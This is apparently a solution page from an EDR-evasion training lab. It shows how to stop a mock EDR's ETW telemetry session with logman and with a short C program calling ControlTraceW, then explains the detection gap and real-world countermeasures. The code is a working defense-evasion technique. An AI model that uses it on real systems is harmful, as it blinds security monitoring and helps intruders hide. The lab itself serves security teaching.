---
layout: default
title: "Solution 25: Kill the Trace Session"
---

# Solution 25: Kill the Trace Session

## The Bypass

ETW trace sessions are system-wide resources managed by the ETW infrastructure. Any administrator can enumerate and stop them.

### Step 1: Enumerate active sessions

```powershell
logman query -ets
```

Look for `MostShittyEDR-Telemetry` in the output.

### Step 2: Kill the session

```powershell
logman stop "MostShittyEDR-Telemetry" -ets
```

The `-ets` flag targets Event Trace Sessions directly (without needing a Data Collector Set).

### Programmatic approach (C)

```c
#include <windows.h>
#include <evntrace.h>

#define SESSION_NAME L"MostShittyEDR-Telemetry"

int main() {
    ULONG bufSize = sizeof(EVENT_TRACE_PROPERTIES) + 
                    (wcslen(SESSION_NAME) + 1) * sizeof(WCHAR) + 2;
    
    EVENT_TRACE_PROPERTIES* props = 
        (EVENT_TRACE_PROPERTIES*)calloc(1, bufSize);
    
    props->Wnode.BufferSize = bufSize;
    props->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
    
    ULONG status = ControlTraceW(
        0,                              // no handle needed
        SESSION_NAME,                   // target by name
        props,
        EVENT_TRACE_CONTROL_STOP        // stop the session
    );
    
    if (status == ERROR_SUCCESS)
        printf("[+] Session killed\n");
    else
        printf("[-] Failed: %lu\n", status);
    
    free(props);
    return 0;
}
```

## Why It Works

- The session name `MostShittyEDR-Telemetry` is **hardcoded** and discoverable
- ETW sessions have **no access control** beyond requiring admin privileges
- The agent checks session health **periodically** (every ~5 seconds), not continuously
- Between the kill and the next check, telemetry events are silently dropped

## Real-World Countermeasures

- Real EDRs run as **kernel drivers** with ETW-TI subscriptions that can't be stopped from user-mode
- Session names can be randomized at install time
- Kernel callbacks (`PsSetCreateProcessNotifyRoutine`) provide telemetry independent of ETW sessions
- Microsoft Defender uses **Protected Process Light (PPL)** to prevent session manipulation

## Verification

```powershell
# Confirm session is gone
logman query -ets | findstr "MostShittyEDR"

# The agent will report:
# [CRITICAL] ETW session 'MostShittyEDR-Telemetry' has been terminated!
```

Note: Rule 8 **will detect** this on the next check cycle. The educational point is that the telemetry gap between kill and detection is exploitable.
